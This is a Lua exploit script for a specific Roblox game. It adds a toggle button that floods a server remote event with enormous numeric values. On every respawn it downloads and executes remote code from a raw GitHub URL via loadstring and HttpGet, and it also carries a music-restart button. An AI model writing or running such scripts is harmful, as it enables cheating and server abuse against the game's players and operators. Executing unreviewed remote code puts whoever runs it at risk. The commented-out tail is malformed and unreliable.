if game.GameId == 4538598064 then
local playerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")

local screenGui = Instance.new("ScreenGui")
screenGui.IgnoreGuiInset = true
screenGui.Parent = playerGui
screenGui.Name = math.random(1,69420)
screenGui.ResetOnSpawn = false

local spamButton = Instance.new("TextButton")
spamButton.Name = "Spam"
spamButton.Text = "Spam"
spamButton.Size = UDim2.new(0, 75, 0, 55)
spamButton.Position = UDim2.new(0.5,155 , 0.8, -25)
spamButton.Parent = screenGui

local audiobtn = Instance.new("TextButton")
audiobtn.Name = "Audio Fix"
audiobtn.Text = "Fix Audio"
audiobtn.Size = UDim2.new(0, 75, 0, 55)
audiobtn.Position = UDim2.new(0.5, -205, 0.8, -25)
audiobtn.Parent = screenGui

local spamming = false

local function spam()
	while spamming do
		local args = {
			[1] = 5.520474058077904e+76,
			[2] = 1,
			[3] = 2.933813859058389e+76
		}

		game.ReplicatedStorage.Network_Generated.GeneratedEvent241:FireServer(unpack(args))
		task.wait()
	end
end

spamButton.MouseButton1Down:Connect(function()
	spamming = not spamming
	if spamming then
		spamButton.Text = "Stop"
		spawn(spam)
	else
		spamButton.Text = "Spam"
	end
end)
audiobtn.MouseButton1Down:Connect(function()
	for i, v in pairs(game.SoundService.Master.Music.Game:GetChildren()) do
        if not v.Playing then
v.Volume = 1
v.Playing=true
game.SoundService.Master.Music.Lobby.Main:Play()
game.SoundService.Master.Music.Lobby.Main.Volume=1
end
    end
end)
function parry()
loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/uuuuuuu/main/phantom%20ball%20script"))()
end

local function OnCharacterAdded()
	parry()
end

game.Players.LocalPlayer.CharacterAdded:Connect(OnCharacterAdded)
OnCharacterAdded()
spawn(function()
task.wait(1)
--[[for i, v in pairs(game.workspace:GetDescendants()) do
        if v.Name == "Leaderboards" then
            v:Destroy()
        end
    end
end)]]
--print'loaded'
end
